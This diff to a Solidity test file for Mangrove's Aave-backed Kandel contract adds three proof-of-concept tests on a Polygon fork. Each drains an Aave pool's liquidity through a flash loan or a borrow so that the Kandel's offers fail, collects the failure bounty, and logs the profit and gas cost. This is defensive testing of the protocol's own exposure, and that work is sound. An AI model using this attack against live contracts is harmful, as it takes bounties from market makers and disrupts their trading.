@@ -18,7 +18,8 @@ contract AaveKandelTest is CoreKandelTest {
   PinnedPolygonFork fork;
   AavePooledRouter router;
   AaveKandel aaveKandel;
-  address THIS = address(this);
+
+  receive() external payable {}
 
   function __setForkEnvironment__() internal override {
     fork = new PinnedPolygonFork();
@@ -256,27 +257,102 @@ contract AaveKandelTest is CoreKandelTest {
     assertEq(kdl_.reserveBalance(Bid), 0, "funds should not be shared");
   }
 
-  function test_liquidity_attack() public {
+  function executeAttack(uint offerId) public {
+    // context base should not be available to redeem for the router, for this attack to succeed
+    (,, uint takerGave, uint bounty,) =
+      mgv.snipes($(base), $(quote), wrap_dynamic([offerId, 0.1 ether, type(uint96).max, type(uint).max]), true);
+    require(takerGave == 0 && bounty > 0, "attack failed");
+  }
+
+  function test_liquidity_flashloan_attack() public {
     AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    deal($(quote), address(this), 1 ether);
+    quote.approve({spender: address(mgv), amount: type(uint).max});
     attacker.setCallbackAddress(address(this));
-    bytes memory cd = abi.encodeWithSelector(this.executeAttack.selector, address(attacker));
+    uint gas = gasleft();
+    uint bestAsk = mgv.best($(base), $(quote));
+    bytes memory cd = abi.encodeWithSelector(this.executeAttack.selector, bestAsk);
     uint assetSupply = attacker.get_supply(base);
+    uint nativeBalance = address(this).balance;
     try attacker.flashloan(base, assetSupply - 1, cd) {
-      assertTrue(true, "Flashloan attack succeeded");
+      gas = gas - gasleft();
+      assertTrue(true, "Flashloan attack succeeded!");
+      console.log("Total profit of the attack:", toUnit(address(this).balance - nativeBalance, 18));
+      console.log("Gas cost:", gas);
     } catch {
       assertTrue(false, "Flashloan attack failed");
     }
   }
 
-  function executeAttack(address attacker) external {
-    deal($(quote), attacker, 1 ether);
-    vm.prank(attacker);
-    quote.approve({spender: address(mgv), amount: type(uint).max});
-    // context base should not be available to redeem for the router, for this attack to succeed
-    uint bestAsk = mgv.best($(base), $(quote));
-    vm.prank(attacker);
-    (,, uint takerGave, uint bounty,) =
-      mgv.snipes($(base), $(quote), wrap_dynamic([bestAsk, 0.1 ether, type(uint96).max, type(uint).max]), true);
-    require(takerGave == 0 && bounty > 0, "attack failed");
+  function test_liquidity_borrow_snipe_attack() public {
+    // base is weth and has a borrow cap, so trying the attack on quote
+    address dai = fork.get("DAI");
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    deal($(base), address(this), 1 ether);
+    base.approve({spender: address(mgv), amount: type(uint).max});
+    uint quoteSupply = attacker.get_supply(quote); // quote in 6 decimals
+    // mocking up a big flashloan of usdc
+    deal(dai, address(attacker), quoteSupply * 2 * 10 ** 12); // dai has 18 decimals
+    attacker.approveLender(IERC20(dai));
+    attacker.supply(IERC20(dai), quoteSupply * 2 * 10 ** 12);
+    uint nativeBal = address(this).balance;
+    uint gas = gasleft(); // adding flash loan overhead
+    try attacker.borrow(quote, quoteSupply - 1) {
+      expectFrom(address(aaveKandel));
+      emit LogIncident(IMangrove($(mgv)), quote, base, 5, "AavePooledRouter/IlliquidPool", "mgv/makerRevert");
+
+      (,, uint takerGave, uint bounty,) = sellToBestAs(address(this), 0.1 ether);
+      require(takerGave == 0 && bounty > 0, "Attack failed");
+      gas = gas - gasleft() + 300_000; // adding flashloan cost
+      console.log(
+        "Attack successful, %s collected for an overhead of %s gas units",
+        toUnit(address(this).balance - nativeBal, 18),
+        gas
+      );
+      (MgvStructs.GlobalPacked global,) = mgv.config(address(0), address(0));
+      uint attacker_cost = gas * global.gasprice() * 10 ** 9;
+      console.log("Gas cost of the attack: %s native tokens", toUnit(attacker_cost, 18));
+    } catch Error(string memory reason) {
+      console.log(reason);
+    }
+  }
+
+  function test_liquidity_borrow_marketOrder_attack() public {
+    /// adding as many offers as possible (adding more will stack overflow when failing offer will cascade)
+    deployOtherKandel(0.1 ether, 100 * 10 ** 6, uint24(1001 * 10 ** kdl.PRECISION() / 1000), 1, 150);
+    //printOrderBook($(quote), $(base));
+    // base is weth and has a borrow cap, so trying the attack on quote
+    address dai = fork.get("DAI");
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    deal($(base), address(this), 1 ether);
+    base.approve({spender: address(mgv), amount: type(uint).max});
+    uint quoteSupply = attacker.get_supply(quote); // quote in 6 decimals
+    // mocking up a big flashloan of usdc
+    deal(dai, address(attacker), quoteSupply * 140 * 10 ** 10); // dai has 18 decimals
+    attacker.approveLender(IERC20(dai));
+    attacker.supply(IERC20(dai), quoteSupply * 140 * 10 ** 10);
+    uint gas = gasleft(); // adding flash loan overhead
+    try attacker.borrow(quote, quoteSupply - 1) {
+      // borrow is ~180K
+      (, uint takerGave, uint bounty,) = mgv.marketOrder({
+        outbound_tkn: $(quote),
+        inbound_tkn: $(base),
+        takerWants: 10,
+        takerGives: 1 ether,
+        fillWants: false
+      });
+
+      require(takerGave == 0 && bounty > 0, "Attack failed");
+      gas = gas - gasleft() + 400_000; // adding flashloan cost + repay of borrow
+      console.log("Attack successful, %s collected for an overhead of %s gas units", toUnit(bounty, 18), gas);
+      (MgvStructs.GlobalPacked global,) = mgv.config(address(0), address(0));
+      uint attacker_cost = gas * global.gasprice() * 10 ** 9;
+      console.log(
+        "Gas cost of the attack (gasprice %s gwei): %s native tokens", global.gasprice(), toUnit(attacker_cost, 18)
+      );
+    } catch Error(string memory reason) {
+      console.log(reason);
+    }
+    printOrderBook($(quote), $(base));
   }
 }
